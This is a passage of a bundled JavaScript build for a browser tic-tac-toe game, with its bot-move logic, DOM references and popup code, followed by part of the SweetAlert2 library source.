    if (arr === null || arr === void 0 ? void 0 : arr.includes(6)) {
        if (arr.includes(9) && !fieldiesBot[2].innerText) {
            handleBotMove(2);
            return;
        }
    }
    if (arr === null || arr === void 0 ? void 0 : arr.includes(7)) {
        if (arr.includes(8) && !fieldiesBot[8].innerText) {
            handleBotMove(8);
            return;
        }
        if (arr.includes(9) && !fieldiesBot[7].innerText) {
            handleBotMove(7);
            return;
        }
    }
    if (arr === null || arr === void 0 ? void 0 : arr.includes(8)) {
        if (arr.includes(9) && !fieldiesBot[6].innerText) {
            handleBotMove(6);
            return;
        }
    }
    return true;
}

},{"./scripts/refs":"jHtzO","./scripts/botCombo":"2BYuR","./scripts/swal":"kRPvh","./scripts/sounds":"7Hlpd"}],"jHtzO":[function(require,module,exports) {
"use strict";
exports.__esModule = true;
exports.refs = void 0;
exports.refs = {
    menu: document.querySelector(".menu"),
    gameDiv: document.querySelector(".gameDiv"),
    gameDivBot: document.querySelector(".gameDivBot"),
    form: document.querySelector(".form"),
    player1: document.querySelector("#player1"),
    player2: document.querySelector("#player2"),
    player1GameName: document.querySelector("#player1Name"),
    player2GameName: document.querySelector("#player2Name"),
    fieldies: document.querySelectorAll(".fieldy"),
    fieldiesBot: document.querySelectorAll(".fieldyBot"),
    restartBtn: document.querySelector("#restartBtn"),
    restartBtnBot: document.querySelector("#restartBtnBot"),
    resetBtn: document.querySelector("#resetBtn"),
    resetBtnBot: document.querySelector("#resetBtnBot"),
    botStart: document.querySelector(".botButton"),
    musicBtn: document.querySelector(".music"),
    soundBtn: document.querySelector(".sound")
};

},{}],"2BYuR":[function(require,module,exports) {
"use strict";
exports.__esModule = true;
exports.createBotCombo = void 0;
function createBotCombo() {
    var rand = Math.round(Math.random() * 10);
    switch(rand){
        case 1:
            return [
                4,
                0,
                2,
                6,
                8,
                1,
                3,
                5,
                7
            ];
        case 2:
            return [
                0,
                8,
                2,
                6,
                4,
                3,
                5,
                7,
                1
            ];
        case 3:
            return [
                0,
                8,
                6,
                2,
                4,
                5,
                3,
                7,
                1
            ];
        case 4:
            return [
                2,
                6,
                0,
                8,
                4,
                1,
                7,
                5,
                3
            ];
        case 5:
            return [
                6,
                2,
                0,
                8,
                4,
                1,
                7,
                3,
                5
            ];
        case 6:
            return [
                6,
                2,
                8,
                0,
                4,
                1,
                5,
                7,
                3
            ];
        case 7:
            return [
                8,
                0,
                6,
                2,
                4,
                5,
                7,
                1,
                3
            ];
        case 8:
            return [
                8,
                0,
                2,
                6,
                4,
                5,
                7,
                3,
                1
            ];
        case 9:
            return [
                2,
                6,
                8,
                0,
                4,
                7,
                3,
                5,
                1
            ];
        default:
            return [
                4,
                0,
                2,
                6,
                8,
                1,
                3,
                7,
                5
            ];
    }
}
exports.createBotCombo = createBotCombo;

},{}],"kRPvh":[function(require,module,exports) {
"use strict";
var __awaiter = this && this.__awaiter || function(thisArg, _arguments, P, generator) {
    function adopt(value) {
        return value instanceof P ? value : new P(function(resolve) {
            resolve(value);
        });
    }
    return new (P || (P = Promise))(function(resolve, reject) {
        function fulfilled(value) {
            try {
                step(generator.next(value));
            } catch (e) {
                reject(e);
            }
        }
        function rejected(value) {
            try {
                step(generator["throw"](value));
            } catch (e) {
                reject(e);
            }
        }
        function step(result) {
            result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected);
        }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = this && this.__generator || function(thisArg, body) {
    var _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    }, f, y, t, g;
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(g && (g = 0, op[0] && (_ = 0)), _)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
};
exports.__esModule = true;
exports.createSwal = void 0;
var sweetalert2_1 = require("sweetalert2");
require("animate.css");
var sounds_1 = require("./sounds");
function createSwal(title, victory) {
    return __awaiter(this, void 0, void 0, function() {
        var url, result;
        return __generator(this, function(_a) {
            switch(_a.label){
                case 0:
                    if (victory) sounds_1.sounds.victorySound.play();
                    else sounds_1.sounds.lostSound.play();
                    url = victory ? "https://cliply.co/wp-content/uploads/2021/09/CLIPLY_372109170_FREE_FIREWORKS_400.gif" : "https://i.pinimg.com/originals/fb/ed/b2/fbedb25b550829b8b4c4984b45992b39.gif";
                    return [
                        4 /*yield*/ ,
                        sweetalert2_1["default"].fire({
                            title: title,
                            padding: 10,
                            background: "rgba(0,0,0,0.2) url(https://img.freepik.com/free-photo/design-space-paper-textured-background_53876-42312.jpg)",
                            backdrop: "\n        rgba(0,0,0,0.8)\n          url(".concat(url, ")\n          left top\n          no-repeat\n        "),
                            confirmButtonText: "Sure!",
                            showCancelButton: true,
                            cancelButtonText: "No, thanks",
                            showCloseButton: true,
                            showClass: {
                                popup: "animate__animated animate__bounceIn"
                            },
                            hideClass: {
                                popup: "animate__animated animate__bounceOut"
                            },
                            customClass: {
                                confirmButton: "button swal",
                                cancelButton: "button swal",
                                closeButton: "black swal"
                            },
                            buttonsStyling: false
                        })
                    ];
                case 1:
                    result = _a.sent();
                    return [
                        2 /*return*/ ,
                        result.isConfirmed
                    ];
            }
        });
    });
}
exports.createSwal = createSwal;

},{"sweetalert2":"1HyFr","animate.css":"8t3va","./sounds":"7Hlpd"}],"1HyFr":[function(require,module,exports) {
/*!
* sweetalert2 v11.6.15
* Released under the MIT License.
*/ (function(global, factory) {
    module.exports = factory();
})(this, function() {
    "use strict";
    /**
   * This module contains `WeakMap`s for each effectively-"private  property" that a `Swal` has.
   * For example, to set the private property "foo" of `this` to "bar", you can `privateProps.foo.set(this, 'bar')`
   * This is the approach that Babel will probably take to implement private methods/fields
   *   https://github.com/tc39/proposal-private-methods
   *   https://github.com/babel/babel/pull/7555
   * Once we have the changes from that PR in Babel, and our core class fits reasonable in *one module*
   *   then we can use that language feature.
   */ var privateProps = {
        awaitingPromise: new WeakMap(),
        promise: new WeakMap(),
        innerParams: new WeakMap(),
        domCache: new WeakMap()
    };
    const swalPrefix = "swal2-";
    /**
   * @param {string[]} items
   * @returns {object}
   */ const prefix = (items)=>{
        const result = {};
        for(const i in items)result[items[i]] = swalPrefix + items[i];
        return result;
    };
    const swalClasses = prefix([
        "container",
        "shown",
        "height-auto",
        "iosfix",
        "popup",
        "modal",
        "no-backdrop",
        "no-transition",
        "toast",
        "toast-shown",
        "show",
        "hide",
        "close",
        "title",
        "html-container",
        "actions",
        "confirm",
        "deny",
        "cancel",
        "default-outline",
        "footer",
        "icon",
        "icon-content",
        "image",
        "input",
        "file",
        "range",
        "select",
        "radio",
        "checkbox",
        "label",
        "textarea",
        "inputerror",
        "input-label",
        "validation-message",
        "progress-steps",
        "active-progress-step",
        "progress-step",
        "progress-step-line",
        "loader",
        "loading",
        "styled",
        "top",
        "top-start",
        "top-end",
        "top-left",
        "top-right",
        "center",
        "center-start",
        "center-end",
        "center-left",
        "center-right",
        "bottom",
        "bottom-start",
        "bottom-end",
        "bottom-left",
        "bottom-right",
        "grow-row",
        "grow-column",
        "grow-fullscreen",
        "rtl",
        "timer-progress-bar",
        "timer-progress-bar-container",
        "scrollbar-measure",
        "icon-success",
        "icon-warning",
        "icon-info",
        "icon-question",
        "icon-error"
    ]);
    const iconTypes = prefix([
        "success",
        "warning",
        "info",
        "question",
        "error"
    ]);
    const consolePrefix = "SweetAlert2:";
    /**
   * Filter the unique values into a new array
   *
   * @param {Array} arr
   * @returns {Array}
   */ const uniqueArray = (arr)=>{
        const result = [];
        for(let i = 0; i < arr.length; i++)if (result.indexOf(arr[i]) === -1) result.push(arr[i]);
        return result;
    };
    /**
   * Capitalize the first letter of a string
   *
   * @param {string} str
   * @returns {string}
   */ const capitalizeFirstLetter = (str)=>str.charAt(0).toUpperCase() + str.slice(1);
    /**
   * Standardize console warnings
   *
   * @param {string | Array} message
   */ const warn = (message)=>{
        console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
    };
    /**
   * Standardize console errors
   *
   * @param {string} message
   */ const error = (message)=>{
        console.error(`${consolePrefix} ${message}`);
    };
    /**
   * Private global state for `warnOnce`
   *
   * @type {Array}
   * @private
   */ const previousWarnOnceMessages = [];
    /**
   * Show a console warning, but only if it hasn't already been shown
   *
   * @param {string} message
   */ const warnOnce = (message)=>{
        if (!previousWarnOnceMessages.includes(message)) {
            previousWarnOnceMessages.push(message);
            warn(message);
        }
    };
    /**
   * Show a one-time console warning about deprecated params/methods
   *
   * @param {string} deprecatedParam
   * @param {string} useInstead
   */ const warnAboutDeprecation = (deprecatedParam, useInstead)=>{
        warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release. Please use "${useInstead}" instead.`);
    };
    /**
   * If `arg` is a function, call it (with no arguments or context) and return the result.
   * Otherwise, just pass the value through
   *
   * @param {Function | any} arg
   * @returns {any}
   */ const callIfFunction = (arg)=>typeof arg === "function" ? arg() : arg;
    /**
   * @param {any} arg
   * @returns {boolean}
   */ const hasToPromiseFn = (arg)=>arg && typeof arg.toPromise === "function";
    /**
   * @param {any} arg
   * @returns {Promise}
   */ const asPromise = (arg)=>hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
    /**
   * @param {any} arg
   * @returns {boolean}
   */ const isPromise = (arg)=>arg && Promise.resolve(arg) === arg;
    /**
   * Gets the popup container which contains the backdrop and the popup itself.
   *
   * @returns {HTMLElement | null}
   */ const getContainer = ()=>document.body.querySelector(`.${swalClasses.container}`);
    /**
   * @param {string} selectorString
   * @returns {HTMLElement | null}
   */ const elementBySelector = (selectorString)=>{
        const container = getContainer();
        return container ? container.querySelector(selectorString) : null;
    };
    /**
   * @param {string} className
   * @returns {HTMLElement | null}
   */ const elementByClass = (className)=>{
        return elementBySelector(`.${className}`);
    };
    /**
   * @returns {HTMLElement | null}
   */ const getPopup = ()=>elementByClass(swalClasses.popup);
    /**
   * @returns {HTMLElement | null}
   */ const getIcon = ()=>elementByClass(swalClasses.icon);
    /**
   * @returns {HTMLElement | null}
   */ const getIconContent = ()=>elementByClass(swalClasses["icon-content"]);
    /**
   * @returns {HTMLElement | null}
   */ const getTitle = ()=>elementByClass(swalClasses.title);
    /**
   * @returns {HTMLElement | null}
   */ const getHtmlContainer = ()=>elementByClass(swalClasses["html-container"]);
    /**
   * @returns {HTMLElement | null}
   */ const getImage = ()=>elementByClass(swalClasses.image);
    /**
   * @returns {HTMLElement | null}
   */ const getProgressSteps = ()=>elementByClass(swalClasses["progress-steps"]);
    /**
   * @returns {HTMLElement | null}
   */ const getValidationMessage = ()=>elementByClass(swalClasses["validation-message"]);
    /**
   * @returns {HTMLElement | null}
   */ const getConfirmButton = ()=>elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`);
    /**
   * @returns {HTMLElement | null}
   */ const getDenyButton = ()=>elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`);
    /**
   * @returns {HTMLElement | null}
   */ const getInputLabel = ()=>elementByClass(swalClasses["input-label"]);
    /**
   * @returns {HTMLElement | null}
   */ const getLoader = ()=>elementBySelector(`.${swalClasses.loader}`);
    /**
   * @returns {HTMLElement | null}
   */ const getCancelButton = ()=>elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`);
    /**
   * @returns {HTMLElement | null}
   */ const getActions = ()=>elementByClass(swalClasses.actions);
    /**
   * @returns {HTMLElement | null}
   */ const getFooter = ()=>elementByClass(swalClasses.footer);
    /**
   * @returns {HTMLElement | null}
   */ const getTimerProgressBar = ()=>elementByClass(swalClasses["timer-progress-bar"]);
    /**
   * @returns {HTMLElement | null}
   */ const getCloseButton = ()=>elementByClass(swalClasses.close);
    // https://github.com/jkup/focusable/blob/master/index.js
    const focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
    /**
   * @returns {HTMLElement[]}
   */ const getFocusableElements = ()=>{
        const focusableElementsWithTabindex = Array.from(getPopup().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])'))// sort according to tabindex
        .sort((a, b)=>{
            const tabindexA = parseInt(a.getAttribute("tabindex"));
            const tabindexB = parseInt(b.getAttribute("tabindex"));
            if (tabindexA > tabindexB) return 1;
            else if (tabindexA < tabindexB) return -1;
            return 0;
        });
        const otherFocusableElements = Array.from(getPopup().querySelectorAll(focusable)).filter((el)=>el.getAttribute("tabindex") !== "-1");
        return uniqueArray(focusableElementsWithTabindex.concat(otherFocusableElements)).filter((el)=>isVisible$1(el));
    };
    /**
   * @returns {boolean}
   */ const isModal = ()=>{
        return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
    };
    /**
   * @returns {boolean}
   */ const isToast = ()=>{
        return getPopup() && hasClass(getPopup(), swalClasses.toast);
    };
    /**
   * @returns {boolean}
   */ const isLoading = ()=>{
        return getPopup().hasAttribute("data-loading");
    };
    // Remember state in cases where opening and handling a modal will fiddle with it.
    const states = {
        previousBodyPadding: null
    };
    /**
   * Securely set innerHTML of an element
   * https://github.com/sweetalert2/sweetalert2/issues/1926
   *
   * @param {HTMLElement} elem
   * @param {string} html
   */ const setInnerHtml = (elem, html)=>{
        elem.textContent = "";
        if (html) {
            const parser = new DOMParser();
            const parsed = parser.parseFromString(html, `text/html`);
            Array.from(parsed.querySelector("head").childNodes).forEach((child)=>{
                elem.appendChild(child);
            });
            Array.from(parsed.querySelector("body").childNodes).forEach((child)=>{
                if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) elem.appendChild(child.cloneNode(true)); // https://github.com/sweetalert2/sweetalert2/issues/2507
                else elem.appendChild(child);
            });
        }
    };
    /**
   * @param {HTMLElement} elem
   * @param {string} className
   * @returns {boolean}
   */ const hasClass = (elem, className)=>{
        if (!className) return false;
        const classList = className.split(/\s+/);
        for(let i = 0; i < classList.length; i++){
            if (!elem.classList.contains(classList[i])) return false;
        }
        return true;
    };
    /**
   * @param {HTMLElement} elem
   * @param {SweetAlertOptions} params
   */ const removeCustomClasses = (elem, params)=>{
        Array.from(elem.classList).forEach((className)=>{
            if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass).includes(className)) elem.classList.remove(className);
        });
    };
    /**
   * @param {HTMLElement} elem
   * @param {SweetAlertOptions} params
   * @param {string} className
   */ const applyCustomClass = (elem, params, className)=>{
        removeCustomClasses(elem, params);
        if (params.customClass && params.customClass[className]) {
            if (typeof params.customClass[className] !== "string" && !params.customClass[className].forEach) {
                warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof params.customClass[className]}"`);
                return;
            }
            addClass(elem, params.customClass[className]);
        }
    };
    /**
   * @param {HTMLElement} popup
   * @param {import('./renderers/renderInput').InputClass} inputClass
   * @returns {HTMLInputElement | null}
   */ const getInput$1 = (popup, inputClass)=>{
        if (!inputClass) return null;
        switch(inputClass){
            case "select":
            case "textarea":
            case "file":
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
            case "checkbox":
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
            case "radio":
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
            case "range":
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
            default:
                return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
        }
    };
    /**
   * @param {HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement} input
   */ const focusInput = (input)=>{
        input.focus();
        // place cursor at end of text in text input
        if (input.type !== "file") {
            // http://stackoverflow.com/a/2345915
            const val = input.value;
            input.value = "";
            input.value = val;
        }
    };
    /**
   * @param {HTMLElement | HTMLElement[] | null} target
   * @param {string | string[] | readonly string[]} classList
   * @param {boolean} condition
   */ const toggleClass = (target, classList, condition)=>{
        if (!target || !classList) return;
        if (typeof classList === "string") classList = classList.split(/\s+/).filter(Boolean);
        classList.forEach((className)=>{
            if (Array.isArray(target)) target.forEach((elem)=>{
                condition ? elem.classList.add(className) : elem.classList.remove(className);
            });
            else condition ? target.classList.add(className) : target.classList.remove(className);
        });
    };
    /**
   * @param {HTMLElement | HTMLElement[] | null} target
   * @param {string | string[] | readonly string[]} classList
   */ const addClass = (target, classList)=>{
        toggleClass(target, classList, true);
    };
    /**
   * @param {HTMLElement | HTMLElement[] | null} target
   * @param {string | string[] | readonly string[]} classList
   */ const removeClass = (target, classList)=>{
        toggleClass(target, classList, false);
    };
    /**
   * Get direct child of an element by class name
   *
   * @param {HTMLElement} elem
   * @param {string} className
   * @returns {HTMLElement | undefined}
   */ const getDirectChildByClass = (elem, className)=>{
        const children = Array.from(elem.children);
        for(let i = 0; i < children.length; i++){
            const child = children[i];
            if (child instanceof HTMLElement && hasClass(child, className)) return child;
        }
    };
    /**
   * @param {HTMLElement} elem
   * @param {string} property
   * @param {*} value
   */ const applyNumericalStyle = (elem, property, value)=>{
        if (value === `${parseInt(value)}`) value = parseInt(value);
        if (value || parseInt(value) === 0) elem.style[property] = typeof value === "number" ? `${value}px` : value;
        else elem.style.removeProperty(property);
    };
    /**
   * @param {HTMLElement} elem
   * @param {string} display
   */ const show = function(elem) {
        let display = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : "flex";
        elem.style.display = display;
    };
    /**
   * @param {HTMLElement} elem
   */ const hide = (elem)=>{
        elem.style.display = "none";
    };
    /**
   * @param {HTMLElement} parent
   * @param {string} selector
   * @param {string} property
   * @param {string} value
   */ const setStyle = (parent, selector, property, value)=>{
        /** @type {HTMLElement} */ const el = parent.querySelector(selector);
        if (el) el.style[property] = value;
    };
    /**
   * @param {HTMLElement} elem
   * @param {any} condition
   * @param {string} display
   */ const toggle = function(elem, condition) {
        let display = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : "flex";
        condition ? show(elem, display) : hide(elem);
    };
    /**
   * borrowed from jquery $(elem).is(':visible') implementation
   *
   * @param {HTMLElement} elem
   * @returns {boolean}
   */ const isVisible$1 = (elem)=>!!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
    /**
   * @returns {boolean}
   */ const allButtonsAreHidden = ()=>!isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
    /**
   * @param {HTMLElement} elem
   * @returns {boolean}
   */ const isScrollable = (elem)=>!!(elem.scrollHeight > elem.clientHeight);
    /**
   * borrowed from https://stackoverflow.com/a/46352119
   *
   * @param {HTMLElement} elem
   * @returns {boolean}
   */ const hasCssAnimation = (elem)=>{
        const style = window.getComputedStyle(elem);
        const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
        const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
        return animDuration > 0 || transDuration > 0;
    };
    /**
   * @param {number} timer
   * @param {boolean} reset
   */ const animateTimerProgressBar = function(timer) {
        let reset = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
        const timerProgressBar = getTimerProgressBar();
        if (isVisible$1(timerProgressBar)) {
            if (reset) {
                timerProgressBar.style.transition = "none";
                timerProgressBar.style.width = "100%";
            }
            setTimeout(()=>{
                timerProgressBar.style.transition = `width ${timer / 1000}s linear`;
                timerProgressBar.style.width = "0%";
            }, 10);
        }
    };
    const stopTimerProgressBar = ()=>{
        const timerProgressBar = getTimerProgressBar();
        const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        timerProgressBar.style.removeProperty("transition");
        timerProgressBar.style.width = "100%";
        const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
        timerProgressBar.style.removeProperty("transition");
        timerProgressBar.style.width = `${timerProgressBarPercent}%`;
    };
    const RESTORE_FOCUS_TIMEOUT = 100;
    /** @type {GlobalState} */ const globalState = {};
    const focusPreviousActiveElement = ()=>{
        if (globalState.previousActiveElement instanceof HTMLElement) {
            globalState.previousActiveElement.focus();
            globalState.previousActiveElement = null;
        } else if (document.body) document.body.focus();
    };
    /**
   * Restore previous active (focused) element
   *
   * @param {boolean} returnFocus
   * @returns {Promise}
   */ const restoreActiveElement = (returnFocus)=>{
        return new Promise((resolve)=>{
            if (!returnFocus) return resolve();
            const x = window.scrollX;
            const y = window.scrollY;
            globalState.restoreFocusTimeout = setTimeout(()=>{
                focusPreviousActiveElement();
                resolve();
            }, RESTORE_FOCUS_TIMEOUT); // issues/900
            window.scrollTo(x, y);
        });
    };
    /**
   * Detect Node env
   *
   * @returns {boolean}
   */ const isNodeEnv = ()=>typeof window === "undefined" || typeof document === "undefined";
    const sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
   <button type="button" class="${swalClasses.close}"></button>
   <ul class="${swalClasses["progress-steps"]}"></ul>
   <div class="${swalClasses.icon}"></div>
   <img class="${swalClasses.image}" />
   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
   <input class="${swalClasses.input}" />
   <input type="file" class="${swalClasses.file}" />
   <div class="${swalClasses.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${swalClasses.select}"></select>
   <div class="${swalClasses.radio}"></div>
   <label for="${swalClasses.checkbox}" class="${swalClasses.checkbox}">
     <input type="checkbox" />
     <span class="${swalClasses.label}"></span>
   </label>
   <textarea class="${swalClasses.textarea}"></textarea>
   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   <div class="${swalClasses.actions}">
     <div class="${swalClasses.loader}"></div>
     <button type="button" class="${swalClasses.confirm}"></button>
     <button type="button" class="${swalClasses.deny}"></button>
     <button type="button" class="${swalClasses.cancel}"></button>
   </div>
   <div class="${swalClasses.footer}"></div>
   <div class="${swalClasses["timer-progress-bar-container"]}">
     <div class="${swalClasses["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
    /**
   * @returns {boolean}
   */ const resetOldContainer = ()=>{
        const oldContainer = getContainer();
        if (!oldContainer) return false;
        oldContainer.remove();
        removeClass([
            document.documentElement,
            document.body
        ], [
            swalClasses["no-backdrop"],
            swalClasses["toast-shown"],
            swalClasses["has-column"]
        ]);
        return true;
    };
    const resetValidationMessage$1 = ()=>{
        globalState.currentInstance.resetValidationMessage();
    };
    const addInputChangeListeners = ()=>{
        const popup = getPopup();
        const input = getDirectChildByClass(popup, swalClasses.input);
        const file = getDirectChildByClass(popup, swalClasses.file);
        /** @type {HTMLInputElement} */ const range = popup.querySelector(`.${swalClasses.range} input`);
        /** @type {HTMLOutputElement} */ const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
        const select = getDirectChildByClass(popup, swalClasses.select);
        /** @type {HTMLInputElement} */ const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
        const textarea = getDirectChildByClass(popup, swalClasses.textarea);
        input.oninput = resetValidationMessage$1;
        file.onchange = resetValidationMessage$1;
        select.onchange = resetValidationMessage$1;
        checkbox.onchange = resetValidationMessage$1;
        textarea.oninput = resetValidationMessage$1;
        range.oninput = ()=>{
            resetValidationMessage$1();
            rangeOutput.value = range.value;
        };
        range.onchange = ()=>{
            resetValidationMessage$1();
            rangeOutput.value = range.value;
        };
    };
    /**
   * @param {string | HTMLElement} target
   * @returns {HTMLElement}
   */ const getTarget = (target)=>typeof target === "string" ? document.querySelector(target) : target;
    /**
   * @param {SweetAlertOptions} params
   */ const setupAccessibility = (params)=>{
        const popup = getPopup();
        popup.setAttribute("role", params.toast ? "alert" : "dialog");
        popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
        if (!params.toast) popup.setAttribute("aria-modal", "true");
    };
    /**
   * @param {HTMLElement} targetElement
   */ const setupRTL = (targetElement)=>{
        if (window.getComputedStyle(targetElement).direction === "rtl") addClass(getContainer(), swalClasses.rtl);
    };
    /**
   * Add modal + backdrop + no-war message for Russians to DOM
   *
   * @param {SweetAlertOptions} params
   */ const init = (params)=>{
        // Clean up the old popup container if it exists
        const oldContainerExisted = resetOldContainer();
        /* istanbul ignore if */ if (isNodeEnv()) {
            error("SweetAlert2 requires document to initialize");
            return;
        }
        const container = document.createElement("div");
        container.className = swalClasses.container;
        if (oldContainerExisted) addClass(container, swalClasses["no-transition"]);
        setInnerHtml(container, sweetHTML);
        const targetElement = getTarget(params.target);
        targetElement.appendChild(container);
        setupAccessibility(params);
        setupRTL(targetElement);
        addInputChangeListeners();
    };
    /**
   * @param {HTMLElement | object | string} param
   * @param {HTMLElement} target
   */ const parseHtmlToContainer = (param, target)=>{
        // DOM element
        if (param instanceof HTMLElement) target.appendChild(param);
        else if (typeof param === "object") handleObject(param, target);
        else if (param) setInnerHtml(target, param);
    };
    /**
   * @param {object} param
   * @param {HTMLElement} target
   */ const handleObject = (param, target)=>{
        // JQuery element(s)
        if (param.jquery) handleJqueryElem(target, param);
        else setInnerHtml(target, param.toString());
    };
    /**
   * @param {HTMLElement} target
   * @param {HTMLElement} elem
   */ const handleJqueryElem = (target, elem)=>{
        target.textContent = "";
        if (0 in elem) for(let i = 0; (i in elem); i++)target.appendChild(elem[i].cloneNode(true));
        else target.appendChild(elem.cloneNode(true));
    };
    /**
   * @returns {'webkitAnimationEnd' | 'animationend' | false}
   */ const animationEndEvent = (()=>{
        // Prevent run in Node env
        /* istanbul ignore if */ if (isNodeEnv()) return false;
        const testEl = document.createElement("div");
        const transEndEventNames = {
            WebkitAnimation: "webkitAnimationEnd",
            // Chrome, Safari and Opera
            animation: "animationend" // Standard syntax
        };
        for(const i in transEndEventNames){
            if (Object.prototype.hasOwnProperty.call(transEndEventNames, i) && typeof testEl.style[i] !== "undefined") return transEndEventNames[i];
        }
        return false;
    })();
    /**
   * Measure scrollbar width for padding body during modal show/hide
   * https://github.com/twbs/bootstrap/blob/master/js/src/modal.js
   *
   * @returns {number}
   */ const measureScrollbar = ()=>{
        const scrollDiv = document.createElement("div");
        scrollDiv.className = swalClasses["scrollbar-measure"];
        document.body.appendChild(scrollDiv);
        const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
    };
    /**
   * @param {SweetAlert2} instance
   * @param {SweetAlertOptions} params
   */ const renderActions = (instance, params)=>{
        const actions = getActions();
        const loader = getLoader();
        // Actions (buttons) wrapper
        if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) hide(actions);
        else show(actions);
        // Custom class
        applyCustomClass(actions, params, "actions");
        // Render all the buttons
        renderButtons(actions, loader, params);
        // Loader
        setInnerHtml(loader, params.loaderHtml);
        applyCustomClass(loader, params, "loader");
    };
    /**
   * @param {HTMLElement} actions
   * @param {HTMLElement} loader
   * @param {SweetAlertOptions} params
   */ function renderButtons(actions, loader, params) {
        const confirmButton = getConfirmButton();
        const denyButton = getDenyButton();
        const cancelButton = getCancelButton();
        // Render buttons
        renderButton(confirmButton, "confirm", params);
        renderButton(denyButton, "deny", params);
        renderButton(cancelButton, "cancel", params);
        handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
        if (params.reverseButtons) {
            if (params.toast) {
                actions.insertBefore(cancelButton, confirmButton);
                actions.insertBefore(denyButton, confirmButton);
            } else {
                actions.insertBefore(cancelButton, loader);
                actions.insertBefore(denyButton, loader);
                actions.insertBefore(confirmButton, loader);
            }
        }
    }
    /**
   * @param {HTMLElement} confirmButton
   * @param {HTMLElement} denyButton
   * @param {HTMLElement} cancelButton
   * @param {SweetAlertOptions} params
   */ function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
        if (!params.buttonsStyling) {
            removeClass([
                confirmButton,
                denyButton,
                cancelButton
            ], swalClasses.styled);
            return;
        }
        addClass([
            confirmButton,
            denyButton,
            cancelButton
        ], swalClasses.styled);
        // Buttons background colors
        if (params.confirmButtonColor) {
